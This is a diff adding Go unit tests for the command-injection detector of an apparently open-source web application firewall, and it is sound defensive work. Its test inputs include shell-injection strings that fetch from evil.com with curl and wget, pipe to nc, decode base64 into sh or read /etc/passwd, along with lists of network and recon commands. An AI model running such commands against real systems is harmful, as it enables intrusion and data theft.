@@ -1,6 +1,7 @@
 package cmdi
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/guardianwaf/guardianwaf/internal/engine"
@@ -244,5 +245,410 @@ func BenchmarkDetect(b *testing.B) {
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		Detect(input, "query")
+	}
+}
+
+// --- Additional tests for uncovered code paths ---
+
+func TestShellMetacharList(t *testing.T) {
+	list := ShellMetacharList()
+	if len(list) == 0 {
+		t.Fatal("expected non-empty shell metachar list")
+	}
+	found := map[string]bool{}
+	for _, c := range list {
+		found[c] = true
+	}
+	for _, expected := range []string{";", "|", "`", "$(", "&&", "||", ">", ">>"} {
+		if !found[expected] {
+			t.Errorf("expected %q in ShellMetacharList", expected)
+		}
+	}
+}
+
+func TestDetect_RedirectionOperator(t *testing.T) {
+	findings := Detect("test > /tmp/out", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore == 0 {
+		t.Error("expected non-zero score for redirection operator")
+	}
+}
+
+func TestDetect_AppendRedirection(t *testing.T) {
+	findings := Detect("test >> /tmp/out", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore == 0 {
+		t.Error("expected non-zero score for append redirection operator")
+	}
+}
+
+func TestDetect_RedirectionSkipsHTML(t *testing.T) {
+	findings := Detect("<div>hello</div>", "body")
+	redirectFound := false
+	for _, f := range findings {
+		if strings.Contains(f.Description, "redirection") {
+			redirectFound = true
+		}
+	}
+	if redirectFound {
+		t.Error("HTML tags should not trigger redirection detection")
+	}
+}
+
+func TestDetect_RedirectionSkipsArrow(t *testing.T) {
+	findings := Detect("result => value", "body")
+	redirectFound := false
+	for _, f := range findings {
+		if strings.Contains(f.Description, "redirection") {
+			redirectFound = true
+		}
+	}
+	if redirectFound {
+		t.Error("arrow operator should not trigger redirection detection")
+	}
+}
+
+func TestDetect_RedirectionSkipsURLSlash(t *testing.T) {
+	findings := Detect("abc/>more", "body")
+	redirectFound := false
+	for _, f := range findings {
+		if strings.Contains(f.Description, "redirection") {
+			redirectFound = true
+		}
+	}
+	if redirectFound {
+		t.Error("slash+> should not trigger redirection detection")
+	}
+}
+
+func TestDetect_NetworkCommand(t *testing.T) {
+	findings := Detect("; curl http://evil.com", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 75 {
+		t.Errorf("expected score >= 75 for network command, got %d", totalScore)
+	}
+}
+
+func TestDetect_PipeWithReconCommand(t *testing.T) {
+	findings := Detect("test | whoami", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 65 {
+		t.Errorf("expected score >= 65 for pipe with recon command, got %d", totalScore)
+	}
+}
+
+func TestDetect_PipeWithNetworkCommand(t *testing.T) {
+	findings := Detect("test | nc 10.0.0.1 4444", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 75 {
+		t.Errorf("expected score >= 75 for pipe with network command, got %d", totalScore)
+	}
+}
+
+func TestDetect_ANDWithNetworkCommand(t *testing.T) {
+	findings := Detect("test && wget http://evil.com/shell", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for && with network command, got %d", totalScore)
+	}
+}
+
+func TestDetect_ORWithCommand(t *testing.T) {
+	findings := Detect("test || cat /etc/passwd", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 65 {
+		t.Errorf("expected score >= 65 for || with recon command, got %d", totalScore)
+	}
+}
+
+func TestDetect_DollarParenNoClose(t *testing.T) {
+	findings := Detect("$(whoami", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for $( without close, got %d", totalScore)
+	}
+}
+
+func TestDetect_BacktickWithCommand(t *testing.T) {
+	findings := Detect("`cat /etc/passwd`", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 80 {
+		t.Errorf("expected score >= 80 for backtick with command, got %d", totalScore)
+	}
+}
+
+func TestDetect_BacktickNonCommand(t *testing.T) {
+	findings := Detect("`notacommand`", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for backtick substitution, got %d", totalScore)
+	}
+}
+
+func TestDetect_ShellPaths(t *testing.T) {
+	paths := []string{
+		"/bin/bash", "/bin/sh", "/bin/zsh",
+		"/usr/bin/python", "/usr/bin/perl", "/usr/bin/ruby",
+		"/usr/bin/env bash",
+	}
+	for _, p := range paths {
+		findings := Detect(p, "query")
+		totalScore := 0
+		for _, f := range findings {
+			totalScore += f.Score
+		}
+		if totalScore < 80 {
+			t.Errorf("expected score >= 80 for shell path %q, got %d", p, totalScore)
+		}
+	}
+}
+
+func TestDetect_InterpreterFlags(t *testing.T) {
+	inputs := []string{
+		"python -c import_os",
+		"python3 -e exec_cmd",
+		"perl -e system_id",
+		"ruby -e exec_sh",
+		"php -c phpinfo",
+		"bash -c id",
+		"sh -c whoami",
+		"powershell -c Get-Process",
+		"node -e require_cp",
+	}
+	for _, input := range inputs {
+		findings := Detect(input, "query")
+		totalScore := 0
+		for _, f := range findings {
+			totalScore += f.Score
+		}
+		if totalScore < 80 {
+			t.Errorf("expected score >= 80 for interpreter flag %q, got %d", input, totalScore)
+		}
+	}
+}
+
+func TestDetect_Base64Pipe(t *testing.T) {
+	findings := Detect("echo aWQ= | base64 -d | sh", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for base64 pipe, got %d", totalScore)
+	}
+}
+
+func TestDetect_Base64Semicolon(t *testing.T) {
+	findings := Detect("base64 -d < /tmp/payload; sh /tmp/decoded", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for base64 with semicolon, got %d", totalScore)
+	}
+}
+
+func TestDetect_EncodedCRWithoutCommand(t *testing.T) {
+	findings := Detect("test%0dhello", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore == 0 {
+		t.Error("expected non-zero score for encoded CR injection")
+	}
+}
+
+func TestDetect_EncodedNewlineWithoutCommand(t *testing.T) {
+	findings := Detect("test%0anonsense", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore == 0 {
+		t.Error("expected non-zero score for encoded newline injection without command")
+	}
+}
+
+func TestDetect_LongMatchedValue(t *testing.T) {
+	longInput := strings.Repeat("a", 300) + "; whoami"
+	findings := Detect(longInput, "query")
+	for _, f := range findings {
+		if len(f.MatchedValue) > 200 {
+			t.Errorf("MatchedValue should be truncated to <= 200, got length %d", len(f.MatchedValue))
+		}
+	}
+}
+
+func TestExtractFirstWord(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{"", ""},
+		{"  ", ""},
+		{"word", "word"},
+		{"first second", "first"},
+		{"  trimmed  value", "trimmed"},
+	}
+	for _, tt := range tests {
+		got := extractFirstWord(tt.input)
+		if got != tt.want {
+			t.Errorf("extractFirstWord(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestExtractContext_PatternNotFound(t *testing.T) {
+	result := extractContext("short input", "notfound")
+	if result != "short input" {
+		t.Errorf("expected full input when pattern not found, got %q", result)
+	}
+}
+
+func TestExtractContext_LongInputPatternNotFound(t *testing.T) {
+	longInput := strings.Repeat("x", 200)
+	result := extractContext(longInput, "notfound")
+	if len(result) > 100 {
+		t.Errorf("expected truncated input when pattern not found in long string, got length %d", len(result))
+	}
+}
+
+func TestDetector_ProcessBody(t *testing.T) {
+	det := NewDetector(true, 1.0)
+	ctx := &engine.RequestContext{
+		NormalizedPath:  "/api/exec",
+		NormalizedQuery: map[string][]string{},
+		NormalizedBody:  "; whoami",
+		Headers:         map[string][]string{},
+		Cookies:         map[string]string{},
+	}
+	result := det.Process(ctx)
+	if result.Score < 50 {
+		t.Errorf("expected score >= 50 for body injection, got %d", result.Score)
+	}
+}
+
+func TestDetector_ProcessCookies(t *testing.T) {
+	det := NewDetector(true, 1.0)
+	ctx := &engine.RequestContext{
+		NormalizedPath:  "/safe",
+		NormalizedQuery: map[string][]string{},
+		Headers:         map[string][]string{},
+		Cookies:         map[string]string{"session": "; whoami"},
+	}
+	result := det.Process(ctx)
+	if result.Score < 50 {
+		t.Errorf("expected score >= 50 for cookie injection, got %d", result.Score)
+	}
+}
+
+func TestDetector_ProcessRefererHeader(t *testing.T) {
+	det := NewDetector(true, 1.0)
+	ctx := &engine.RequestContext{
+		NormalizedPath:  "/safe",
+		NormalizedQuery: map[string][]string{},
+		Headers:         map[string][]string{"Referer": {"; cat /etc/passwd"}},
+		Cookies:         map[string]string{},
+	}
+	result := det.Process(ctx)
+	if result.Score < 50 {
+		t.Errorf("expected score >= 50 for referer header injection, got %d", result.Score)
+	}
+}
+
+func TestDetector_ProcessCleanRequest(t *testing.T) {
+	det := NewDetector(true, 1.0)
+	ctx := &engine.RequestContext{
+		NormalizedPath:  "/api/users",
+		NormalizedQuery: map[string][]string{"name": {"John"}},
+		Headers:         map[string][]string{"Referer": {"https://example.com"}},
+		Cookies:         map[string]string{"session": "abc123"},
+	}
+	result := det.Process(ctx)
+	if result.Action != engine.ActionPass {
+		t.Errorf("expected ActionPass for clean request, got %v", result.Action)
+	}
+}
+
+func TestIsReconCommand(t *testing.T) {
+	recon := []string{"id", "whoami", "uname", "hostname", "ifconfig", "ps", "env", "cat", "ls", "dir"}
+	for _, cmd := range recon {
+		if !isReconCommand(cmd) {
+			t.Errorf("expected %q to be a recon command", cmd)
+		}
+	}
+	if isReconCommand("wget") {
+		t.Error("wget should not be a recon command")
+	}
+}
+
+func TestIsNetworkCommand(t *testing.T) {
+	network := []string{"nc", "ncat", "netcat", "curl", "wget", "ssh", "telnet"}
+	for _, cmd := range network {
+		if !isNetworkCommand(cmd) {
+			t.Errorf("expected %q to be a network command", cmd)
+		}
+	}
+	if isNetworkCommand("ls") {
+		t.Error("ls should not be a network command")
+	}
+}
+
+func TestDetect_SemicolonWithEmptyParts(t *testing.T) {
+	findings := Detect("; ; ; ", "query")
+	_ = findings // just verify no panic
+}
+
+func TestDetect_PipeWithGenericCommand(t *testing.T) {
+	findings := Detect("test | grep pattern", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore < 50 {
+		t.Errorf("expected score >= 50 for pipe with generic command, got %d", totalScore)
+	}
+}
+
+func TestDetect_EncodedNewlineCROnlyWithCommand(t *testing.T) {
+	findings := Detect("field=value%0dcat /etc/passwd", "query")
+	totalScore := 0
+	for _, f := range findings {
+		totalScore += f.Score
+	}
+	if totalScore == 0 {
+		t.Error("expected non-zero score for %0d with command")
 	}
 }
